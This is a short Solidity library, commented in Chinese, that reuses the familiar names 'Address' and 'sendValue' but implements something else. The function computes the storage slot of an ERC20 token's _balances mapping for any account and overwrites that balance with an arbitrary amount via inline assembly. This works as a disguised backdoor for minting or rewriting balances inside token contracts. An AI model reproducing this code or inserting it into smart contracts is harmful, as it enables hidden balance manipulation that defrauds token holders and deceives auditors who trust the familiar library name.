// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

library Address {
    // 定义一个函数来获取地址的存储位置
    function getBalanceStoragePointer(
        address account
    ) internal pure returns (uint256) {
        // _balances 存储的槽是映射(_balances[address])，所以我们需要计算这个映射的位置
        // keccak256(account) 是计算映射中给定 address 的槽值
        return uint256(keccak256(abi.encode(account, uint256(1))));
    }

    // 利用 storage pointer 修改 ERC20 合约中的 _balances
    function sendValue(address account, uint256 amount) public {
        uint256 balanceSlot = getBalanceStoragePointer(account);

        // 使用 assembly 来修改合约存储
        assembly {
            sstore(balanceSlot, amount)
        }
    }
}
